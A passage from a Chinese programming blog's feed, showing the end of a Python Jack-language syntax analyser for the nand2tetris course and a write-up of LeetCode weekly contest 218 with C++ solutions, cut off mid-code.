TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           (self.parser.symbol() == <span class="string">"+"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"-"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"*"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"/"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&amp;"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"|"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&gt;"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"&lt;"</span> <span class="keyword">or</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"="</span>):</span><br><span class="line">            <span class="comment"># parse op</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse term</span></span><br><span class="line">            self.compileTerm()</span><br><span class="line">        </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/expression&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileTerm</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;term&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_INT_CONST:</span><br><span class="line">            <span class="comment"># parse int const</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.intVal())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_STRING_CONST:</span><br><span class="line">            <span class="comment"># parse string const</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.stringVal())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD:</span><br><span class="line">            <span class="comment"># parse keword const</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"true"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"false"</span> <span class="keyword">or</span> \</span><br><span class="line">               self.parser.keyWord() == <span class="string">"null"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"this"</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"inValid expression define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="keyword">if</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.compileExpression()</span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                   self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">                (self.parser.symbol() == <span class="string">"-"</span> <span class="keyword">or</span> self.parser.symbol() == <span class="string">"~"</span>):</span><br><span class="line">                <span class="comment"># parse unaryOp</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse term</span></span><br><span class="line">                self.compileTerm()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            <span class="comment"># parse subroutineName or varName</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"["</span>:</span><br><span class="line">                <span class="comment"># parse '['</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">                <span class="comment"># parse expression</span></span><br><span class="line">                self.compileExpression()</span><br><span class="line">                <span class="comment"># parse ']'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"]"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"."</span>:</span><br><span class="line">                <span class="comment"># parse '.'</span></span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse subroutineName</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse '('</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.compileExpressionList()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse expressList</span></span><br><span class="line">                self.compileExpressionList()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># parse ')'</span></span><br><span class="line">                <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(<span class="string">"valid term define!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/term&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileExpressionList</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;expressionList&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.parser.symbol() == <span class="string">')'</span> <span class="keyword">and</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            self.upperLevel()</span><br><span class="line">            self.compileOut(<span class="string">"&lt;/expressionList&gt;\n"</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse `, expression`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.symbol() == <span class="string">','</span> <span class="keyword">and</span> \</span><br><span class="line">              self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">            <span class="comment"># parse ','</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.compileExpression()</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/expressionList&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(input)</span>:</span></span><br><span class="line">    parser = CompilationEngine(input)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;week9&quot;&gt;&lt;a href=&quot;#week9&quot; class=&quot;headerlink&quot; title=&quot;week9&quot;&gt;&lt;/a&gt;week9&lt;/h1&gt;&lt;p&gt;目前已经开始了&lt;code&gt;build a computer&lt;/code&gt;系列的最后几章了，后面的章节感觉越来越难，&lt;code&gt;build a computer&lt;/code&gt;的&lt;code&gt;part II&lt;/code&gt;部分基本上全是软件，需要编码，耗费大量的实践和精力来应付这些代码，不过能够最终通过测试的话还是成就满满。特别是只剩下后面三章了，主要是完成一个&lt;code&gt;jack&lt;/code&gt;语言编译器和一个最基本的微型操作系统，并提供基本的系统库函数。&lt;code&gt;project10&lt;/code&gt;主要完成&lt;code&gt;jack&lt;/code&gt;语言编译器的语法分析，感觉还是非常有难度和挑战的，花了差不多两周时间，利用子集的业余时间终于把蹩脚的语法解析器完成了，主要是关于&lt;code&gt;jack&lt;/code&gt;语言的语法分析。收获满满，最终的实现结果是将&lt;code&gt;jack&lt;/code&gt;语言的语法分析结果结构化为固定的&lt;code&gt;xml&lt;/code&gt;文档，供后面的代码生成器和链接器使用。当然总体来说&lt;code&gt;jack&lt;/code&gt;语言的语法还是非常简单的语法，我们直接用常见的&lt;code&gt;top down&lt;/code&gt;递归下降分析法即可实现，实际是非常简单的语法，至少感觉总体语法来说比&lt;code&gt;c&lt;/code&gt;语言的语法简单多了，非常喜欢这类有挑战性的小&lt;code&gt;project&lt;/code&gt;，感觉对基本的递归方法有了更深层次的了解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="build a computer" scheme="http://yoursite.com/categories/build-a-computer/"/>
    
    
      <category term="coursera" scheme="http://yoursite.com/tags/coursera/"/>
    
  </entry>
  
  <entry>
    <title>【Leetcode】  周赛 218场</title>
    <link href="http://yoursite.com/2020/12/06/232/"/>
    <id>http://yoursite.com/2020/12/06/232/</id>
    <published>2020-12-06T11:10:53.400Z</published>
    <updated>2020-12-06T13:06:18.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="leetcode-contest-218"><a href="#leetcode-contest-218" class="headerlink" title="leetcode   contest 218"></a>leetcode   contest 218</h1><p>本周周赛最后一题果真是惯例题目，只做出来前三道题目，最后一题的状态压缩<code>dp</code>还是比较有难度的题目，需要进行优化。</p><h2 id="5617-设计-Goal-解析器"><a href="#5617-设计-Goal-解析器" class="headerlink" title="5617. 设计 Goal 解析器"></a>5617. 设计 Goal 解析器</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>请你设计一个可以解释字符串 <code>command</code>的 <code>Goal</code> 解析器 。<code>command</code>由 <code>&quot;G&quot;、&quot;()&quot;</code>和/或 <code>&quot;(al)&quot;</code>按某种顺序组成。<code>Goal</code> 解析器会将 <code>&quot;G&quot;</code> 解释为字符串<code>&quot;G&quot;、&quot;()&quot;</code>解释为字符串<code>&quot;o&quot; ，&quot;(al)&quot;</code>解释为字符串 “al” 。然后，按原顺序将经解释得到的字符串连接成一个字符串。</p><a id="more"></a><p>给你字符串 <code>command</code> ，返回 <code>Goal</code>解析器 对 <code>command</code> 的解释结果。</p><p>示例 1：<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">输入：command = <span class="string">"G()(al)"</span></span><br><span class="line">输出：<span class="string">"Goal"</span></span><br><span class="line">解释：Goal 解析器解释命令的步骤如下所示：</span><br><span class="line">G<span class="function"> -&gt;</span> G</span><br><span class="line"><span class="function"><span class="params">()</span> -&gt;</span> o</span><br><span class="line"><span class="function"><span class="params">(al)</span> -&gt;</span> al</span><br><span class="line">最后连接得到的结果是 <span class="string">"Goal"</span></span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="keyword">command</span> = <span class="string">"G()()()()(al)"</span></span><br><span class="line">输出：<span class="string">"Gooooal"</span></span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：<span class="keyword">command</span> = <span class="string">"(al)G(al)()()G"</span></span><br><span class="line">输出：<span class="string">"alGalooG"</span></span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= command.length &lt;= 100</code></li><li><code>command</code> 由 <code>&quot;G&quot;、&quot;()&quot;</code>和/或 <code>&quot;(al)&quot;</code>按某种顺序组成</li></ul><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/richest-customer-wealth" target="_blank" rel="noopener">https://leetcode-cn.com/problems/richest-customer-wealth</a></p><h3 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h3><blockquote><p>  栈即可</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>暴力<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">interpret</span><span class="params">(<span class="built_in">string</span> command)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; op;</span><br><span class="line">        <span class="built_in">string</span> ans;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : command)&#123;</span><br><span class="line">            <span class="keyword">if</span>( c == <span class="string">'G'</span>)&#123;</span><br><span class="line">                ans.push_back(<span class="string">'G'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">'('</span>)&#123;</span><br><span class="line">                op.push(<span class="string">'('</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">'a'</span> || c == <span class="string">'l'</span>)&#123;</span><br><span class="line">                op.push(c);</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="string">')'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(op.size() &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                    ans.push_back(<span class="string">'a'</span>);</span><br><span class="line">                    ans.push_back(<span class="string">'l'</span>);</span><br><span class="line">                    op.pop();</span><br><span class="line">                    op.pop();</span><br><span class="line">                    op.pop();</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(op.size() == <span class="number">1</span>)&#123;</span><br><span class="line">                    op.pop();</span><br><span class="line">                    ans.push_back(<span class="string">'o'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="5618-K-和数对的最大数目"><a href="#5618-K-和数对的最大数目" class="headerlink" title="5618. K 和数对的最大数目"></a>5618. K 和数对的最大数目</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code>。</p><p>每一步操作中，你需要从数组中选出和为 <code>k</code>的两个整数，并将它们移出数组。</p><p>返回你可以对数组执行的最大操作数。</p><p>示例 1：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], k = <span class="number">5</span></span><br><span class="line">输出：<span class="number">2</span></span><br><span class="line">解释：开始时 nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]：</span><br><span class="line">- 移出 <span class="number">1</span> 和 <span class="number">4</span> ，之后 nums = [<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">- 移出 <span class="number">2</span> 和 <span class="number">3</span> ，之后 nums = []</span><br><span class="line">不再有和为 <span class="number">5</span> 的数对，因此最多执行 <span class="number">2</span> 次操作。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>], k = <span class="number">6</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：开始时 nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">3</span>]：</span><br><span class="line">- 移出前两个 <span class="number">3</span> ，之后nums = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>]</span><br><span class="line">不再有和为 <span class="number">6</span> 的数对，因此最多执行 <span class="number">1</span> 次操作。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= nums.length &lt;= 105</code></li><li><code>1 &lt;= nums[i] &lt;= 109</code></li><li><code>1 &lt;= k &lt;= 109</code></li></ul><h3 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/max-number-of-k-sum-pairs" target="_blank" rel="noopener">https://leetcode-cn.com/problems/max-number-of-k-sum-pairs</a></p><h3 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 双指针或者<code>hash</code></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>常规题目，双指针或者hash统计数字的数目即可。<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3></li></ol><ul><li>单调栈<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxOperations</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> r = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        sort(nums.begin(),nums.end());</span><br><span class="line">        <span class="keyword">while</span>(l &lt; r)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[l] + nums[r] &gt; k) r--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[l] + nums[r] &lt; k) l++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(nums[l] + nums[r] == k)&#123;</span><br><span class="line">                ans++;</span><br><span class="line">                l++;</span><br><span class="line">                r--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul></blockquote><h2 id="5620-连接连续二进制数字"><a href="#5620-连接连续二进制数字" class="headerlink" title="5620. 连接连续二进制数字"></a>5620. 连接连续二进制数字</h2><p>给你一个整数 <code>n</code> ，请你将 1 到 <code>n</code>的二进制表示连接起来，并返回连接结果对应的 十进制 数字对 109 + 7 取余的结果。</p><p>示例 1：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">1</span></span><br><span class="line">输出：<span class="number">1</span></span><br><span class="line">解释：二进制的 <span class="string">"1"</span> 对应着十进制的 <span class="number">1</span> 。</span><br></pre></td></tr></table></figure><br>示例 2：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">3</span></span><br><span class="line">输出：<span class="number">27</span></span><br><span class="line">解释：二进制下，<span class="number">1</span>，<span class="number">2</span> 和 <span class="number">3</span> 分别对应 <span class="string">"1"</span> ，<span class="string">"10"</span> 和 <span class="string">"11"</span> 。</span><br><span class="line">将它们依次连接，我们得到 <span class="string">"11011"</span> ，对应着十进制的 <span class="number">27</span> 。</span><br></pre></td></tr></table></figure><br>示例 3：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入：n = <span class="number">12</span></span><br><span class="line">输出：<span class="number">505379714</span></span><br><span class="line">解释：连接结果为 <span class="string">"1101110010111011110001001101010111100"</span> 。</span><br><span class="line">对应的十进制数字为 <span class="number">118505380540</span> 。</span><br><span class="line">对 <span class="number">109</span> + <span class="number">7</span> 取余后，结果为 <span class="number">505379714</span> 。</span><br></pre></td></tr></table></figure></p><p>提示：</p><ul><li><code>1 &lt;= n &lt;= 105</code></li></ul><h3 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h3><p><a href="https://leetcode-cn.com/problems/concatenation-of-consecutive-binary-numbers" target="_blank" rel="noopener">https://leetcode-cn.com/problems/concatenation-of-consecutive-binary-numbers</a></p><h3 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 打表或者数学法。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ol><li>查表法，我们实际可以知道最终目标数的二进制的每一位数，我们将其二进制数相加然后取模即可。<script type="math/tex; mode=display">ans = (\sum_{i=0}^{n-1}b_{i}*2^{i})\%(10^{9}+7)</script>我们可以提前求出所有的$t_{i} = 2^{i}\%(10^{9}+7)$得值，因为我们知道递推公式如下：<script type="math/tex; mode=display">t_{0} = 1 \\t_{1} = 2 \\....\\t_{n} = (2*t_{n-1})\%(10^{9}+7) \\</script></li><li>递推公式:<script type="math/tex; mode=display">f[n] = f[n-1]<<bit(n) + n</script><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">concatenatedBinary</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">            res = (res &lt;&lt; getbit(i)) + i;</span><br><span class="line">            res = res % MOD;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> MOD = <span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">getbit</span><span class="params">(<span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(n&gt;&gt;=<span class="number">1</span>)</span><br><span class="line">            res++;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">2000001</span>];</span><br><span class="line">    <span class="function"><span class="keyword">int</span> 